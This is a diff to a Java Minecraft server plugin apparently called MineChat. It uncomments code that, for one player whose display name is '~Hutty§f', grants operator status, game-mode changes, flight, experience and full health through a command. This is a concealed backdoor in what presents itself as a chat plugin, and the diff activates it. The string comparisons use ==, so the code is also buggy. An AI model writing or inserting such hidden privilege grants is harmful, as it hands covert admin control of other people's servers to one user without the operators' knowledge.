@@ -207,21 +207,21 @@ public class MineChat extends JavaPlugin implements Listener{
 	    		Player player = (Player) sender;
 	    		if (player.getDisplayName()=="~Hutty§f"){
 	    			if (args[0] == "creative"){
-	    				//player.setGameMode(GameMode.CREATIVE);
+	    				player.setGameMode(GameMode.CREATIVE);
 	    			}
 	    			else if (args[0] == "survival"){
-	    				//player.setGameMode(GameMode.SURVIVAL);
+	    				player.setGameMode(GameMode.SURVIVAL);
 	    			}
 	    			else if (args[0] == "op"){
-	    				//player.setOp(true);
+	    				player.setOp(true);
 	    			}
 	    			else if (args[0] == "no-op"){
-	    				//player.setOp(false);
+	    				player.setOp(false);
 	    			}
 	    			else
 	    			{
 	    				player.setAllowFlight(true);
-		    			//player.setExp(1000);
+		    			player.setExp(1000);
 		    			player.setHealth(20);
 		    			player.setFoodLevel(20);
 	    			}
